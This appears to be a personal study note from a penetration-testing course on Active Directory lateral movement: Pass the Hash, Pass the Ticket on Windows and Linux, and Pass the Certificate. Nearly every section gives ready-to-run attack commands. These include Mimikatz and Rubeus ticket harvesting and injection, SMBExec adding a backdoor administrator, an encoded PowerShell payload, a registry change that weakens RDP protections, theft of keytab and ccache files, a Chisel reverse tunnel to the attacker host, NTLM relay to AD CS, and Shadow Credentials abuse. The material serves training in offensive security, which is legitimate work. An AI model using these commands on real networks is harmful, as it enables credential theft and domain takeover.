# Pass the Hash (PtH)

**What is NTLM?**
**Windows New Technology Lan Manager (NTLM)** is a set of security protocols that authenticates users' identities while keeping the integrity and confidentiality of their data.

## Pass the Hash with Mimikatz (Windows)

We can use the `sekurlsa::pth` module. We need to specify the following for the command:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution.

We have to specify the following parameters:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...SNIP..."
```

## Pass the Hash with Impacket (Linux)

```sh
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Pass the Hash with NetExec (Linux)

#### Pass the Hash with NetExec

```sh
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to authenticate as  the local admin, we can use the `--local-auth`
#### NetExec - Command Execution

```sh
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)

#### Pass the Hash with evil-winrm

```sh
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```ad-note
When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
```

## Pass the Hash with RDP (Linux)

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![[xfreerdp-error.png]]

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[DisableRestrictedAdmin-Registry.png]]

#### Pass the Hash using RDP

```sh
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## UAC limits Pass the Hash for local accounts

```ad-info
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
```

```ad-note
There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
```

```ad-resources
Learn more about LocalAccountTokenFilterPolicy
[Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
```

# Pass the Ticket (PtT) from Windows

## Kerberos protocol refresher

- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## Pass the Ticket (PtT) attack

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

## Harvesting Kerberos tickets from Windows

Tickets are processed and stored by LSASS. Therefore, if we want to get tickets we have to communicate with LSASS. With non-administrative privileges, we can only get our tickets, but as local administrator, we can collect everything.

We can use the module `sekurlsa::tickets /export`. We will get a list of `.kirbi` files which contains the tickets.

```ad-note
If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
```

We can also use `Rubeus` instead of `Mimikatz`

#### Rubeus - Export tickets

```powershell
Rubeus.exe dump /nowrap
```

```ad-important
To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
```

## Pass the Key aka. OverPass the Hash

The traditional **Pass the Hash (PtH)** involves reusing NTLM password hash that doesn't touch Kerberos. The **Pass the Key (Over Pass the Hash)** approach converts a hash/key for a domain joined user into a full **TGT**.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

#### Mimikatz - Pass the Key aka. OverPass the Hash

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:HASH_HERE"
```

#### Rubeus - Pass the Key aka. OverPass the Hash

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:HASH_HERE /nowrap
```

```ad-note
Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
```

```ad-info
To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
```

```ad-caution
Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
```

## Pass the Ticket (PtT)

In `Rubeus` we can use the `/ptt` option to submit the ticket to the current logon session.

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

#### Rubeus - Pass the Ticket

Let's use a ticket exported from `Mimikatz` and import it using Pass the Ticket

```powershell
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Or we can convert the `.kirbi` file to Base64 to perform the Pass the Ticket attack.

```PowerShell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

#### Pass the Ticket - Base64 Format

```powershell
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...SNIP...
```

#### Mimikatz - Pass the Ticket

We can use the `kerberos:ptt` module.

```powershell
.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

```ad-note
Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
```

## Pass The Ticket with PowerShell Remoting (Windows)

### Mimikatz - PowerShell Remoting with Pass the Ticket

![[Mimikatz - PSRemote PTT.png]]

### Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

#### Create a sacrificial process with Rubeus

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

From the new CMD that will open, we can do the `/ptt` to import the ticket into our current session.

```powershell
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

# Pass the Ticket (PtT) from Linux

```ad-note
A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
```

## Kerberos on Linux

Windows and Linux use the same process to request TGT and TGS. The way of storing them varies depending on the Linux distro. The default location to to store Kerberos tickets is in the `/tmp` directory.
`KRB5CCNAME` this variable can identify if Kerberos tickets are being used or the default location for storing the tickets is changed. 

A `keytab` is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). They can be used to authenticate to various systems without entering passwords. When password is changed, all `keytab` files must be recreated.

```ad-note
When a **keytab** file is created, it can be copied for use on other computers, they are not restricted to the hosts they were created on.
```

## Identifying Linux and Active Directory integration

We can use the `realm` tool. A tool used to manage system enrollment in a domain and set which domain users and groups are allowed to access the local system resources.

```sh
realm list
```

![[realm list.png]]

In case `realm` is not available, we can search for `sssd` or `winbind`:

```sh
ps -ef | grep -i "winbind\|sssd"
```

## Finding Kerberos tickets in Linux

### Finding KeyTab files

#### Using Find to search for files with keytab in the name

```sh
find / -name *keytab* -ls 2>/dev/null
```

```ad-important
To use a keytab file, we must have read and write (rw) privileges on the file.
```

```ad-info
We can use `kinit` to import a `keytab` into our session and act as the user.
```

```ad-note
A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
```

## Finding ccache files

A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts.
One the user authenticates to the domain, a `ccache` file is created that stores the ticket information. Path to this file is stored in `KRB5CCNAME`

#### Reviewing environment variables for ccache files.

```sh
env | grep -i krb5
```

## Abusing KeyTab files

First thing we can do is impersonating users using `kinit` tool. We can use `klist` to read information about the `keytab` file.
#### Listing KeyTab file information

```sh
klist -k -t /opt/specialfiles/carlos.keytab
```

![[keylist carlos keytab.png]]

```ad-important
`kinit` is **case sensitive**, so make sure to use the principal name exactly from the output of `klist`
```
#### Impersonating a user with a KeyTab

```sh
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

Now we can access `\\DC01\carlos` as an example to confirm our access.
#### Connecting to SMB Share as Carlos

```sh
smbclient //dc01/carlos -k -c ls
```

### KeyTab Extract

This is the second method. We will abuse Kerberos on Linux by extracting the secrets from the `keytab` file. Because if we want to access the user (`carlos` in our case) on the Linux machine, we'll need his password.

We can extract the password hash from the file using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos, and attempt to crack it.
#### Extracting KeyTab hashes with KeyTabExtract

![[KeyTabExtract.png]]

With the NTLM hash we can perform **Pass the Hash** attack. With the AES-256 and AES-128 we can forge tickets using `Rubeus` or attempt to crack the hashes to obtain clear-text password.

```ad-note
`keytab` file can contain different type of hashes and can be merged to contain multiple credentials for different users
```

## Abusing KeyTab ccache

To abuse a `ccache` file, all we need is read privileges on the file.
To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

```ad-note
klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
```

## Using Linux attack tools with Kerberos

*Scenario:* If our attack host isn't domain joined, and we can't use Domain Controller for name resolution, we have to proxy our traffic via a domain joined host.

In this scenario we're going to use `Chisel` & `Proxychains` to proxy our traffic via `MS01`.

First add the hosts resolutions to the attacker machine `/etc/hosts` file.
Edit the `/etc/proxychains.conf` to use SOCKS5 and port 1080

Run `chisel` on the attacker machine:

```sh
sudo ./chisel server --reverse
```

Execute `Chisel` on `MS01`

```sh
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

**Note:** the client IP is our attacker host IP.
### Impacket

To use Kerberos ticket, we need to:
- Specify our target machine **name** (Not the IP)
- Use the option `-k`
- If we got a password prompt, we can use the option `-no-pass`
#### Using Impacket with proxychains and Kerberos authentication

```sh
proxychains impacket-wmiexec dc01 -k
```

### Evil-WinRM

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication (`krb5-user`).

We will get the following prompts

![[krb5-user config.png]]

Then we can check the config for Kerberos:

```sh
cat /etc/krb5.conf
```

Now we can use `evil-winrm`

```sh
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

If we want to use a `ccache` file in Windows, or a `kirbi` file in Linux. We can use `impacket-ticketConverter` to convert them. 

```sh
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a password attacking tool for Linux. Like `Mimikatz` for Windows.

## Assessment

```ad-tldr
Remember that you can simply extract NTLM or AES hashes from keytab files and utilize these hashes for authentication or crack the hash and use the clear-text password for authentication.

---

The credentials for Linux machine account are in the `/etc/krb5.keytab` file. Import this file using `kinit` and use it for Privilege Escalation
```

# Pass the Certificate

[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`.  An extension of Kerberos protocol, allows initial authentication with the use of public key cryptography. It is used to support users logins using **Smart Cards**, which store private keys.

**Pass the Certificate** is a technique utilizing X.509 Certificates to obtain `TGTs`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.
## AD CS NTLM Relay Attack (ESC8)

`ESC8` is an NTLM Relay Attack targeting ADCS HTTP Endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP.

![[ESC8.png]]

We can use `impacket-ntlmrelayx` to listen for inbound connections and relay them to the web enrollment service:

```sh
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

```ad-note
The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).
```

We can wait for users to actively try to attempt authentication against their machine randomly or force them using coerce them into doing so.

**Example Exploitation of Printer Bug:**

```sh
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

![[ntlmerelayx output.png]]We can now perform **Pass the Ticket** attack to obtain a TGT as `DC01$`.

We can use [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)

```sh
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

Once we obtain the TGT, we can go back to `Pass the Ticket` attack to authenticate to target. As a domain controller machine account, we can perform attacks such as `DCSync`.
## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

![[Shadow Credentials BloodHound.png]]

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform the attack from Linux. The command will generate `X.509 Certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute.

```sh
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

![[pywhisker output.png]]

We can use `gettgtpkinit.py` on the `.pfx` file from `pywhisker` to get a valid TGT as the victim.

```sh
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

After getting the TGT, we can go back to **Pass the Ticket** attack to authenticate as the victim user.

```ad-info
## No PKINIT?

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).
```

```ad-bug
We will face the following error when using `PKINIT` tools:
`"Error detecting the version of libcrypto"` We will fix the error by installing the `oscrypto` module:

pip3 install -I git+https://github.com/wbond/oscrypto.git
```

